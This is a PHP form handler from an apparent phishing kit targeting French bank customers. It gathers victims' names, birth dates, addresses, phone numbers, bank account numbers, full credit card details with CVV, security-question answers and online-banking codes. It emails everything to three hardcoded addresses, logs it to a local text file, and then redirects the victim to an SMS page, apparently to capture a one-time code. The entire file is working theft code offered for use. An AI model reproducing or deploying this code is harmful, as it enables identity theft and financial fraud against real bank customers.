<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT FR |--------------|\n";
$message .= "|Pr&eacute;nom            : ".$_POST['AK01']."\n";
$message .= "|Nom          : ".$_POST['AK02']."\n";
$message .= "|Naissance          : ".$_POST['AK03']."-".$_POST['AK04']."-".$_POST['AK05']."\n";
$message .= "|Adresse          : ".$_POST['AK06']."\n";
$message .= "|Code Postal          : ".$_POST['AK07']."\n";
$message .= "|T&eacute;l&eacute;phone          : ".$_POST['AK08']."\n";
$message .= "|----------| cvv |--------------|\n";
$message .= "Nom de la banque: ".$_POST['bank']."\n";
$message .= "num de compte   : ".$_POST['account']."\n";
$message .= "Carte de credit : ".$_POST['ccnum']."\n";
$message .= "Date expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "================================================================\n";
$message .= "Rue grandi      : ".$_POST['reponses']."\n";
$message .= "Ami d'enfance   : ".$_POST['reponses2']."\n";
$message .= "================================================================\n";
$message .= "Sa reponse question 1     : ".$_POST['reponseslcl']."\n";
$message .= "Sa reponse question 2     : ".$_POST['reponseslcl2']."\n";
$message .= "================================================================\n";
$message .= "Banque Distance : ".$_POST['ibad']."\n";
$message .= "================================================================\n";
$message .= "Code Client : ".$_POST['sgclient']."\n";
$message .= "Date de naissance : ".$_POST['sgdepart']."\n";
$message .= "cyberplus : ".$_POST['plus']."\n";
$message .= "cvv|".$ip."\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------| YOUR WELCOME AZUBI|--------------|\n";
$send = "ucefanouar@gmail.com , yanouar@yahoo.com , hbibarzlt@outlook.fr ";
$subject = "A777 JATK CC FR- From:  [ $ip ]";
{
mail("$send", "$subject", $message);
}

$file = fopen("./robot.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);

header("Location:sms.html");
?>


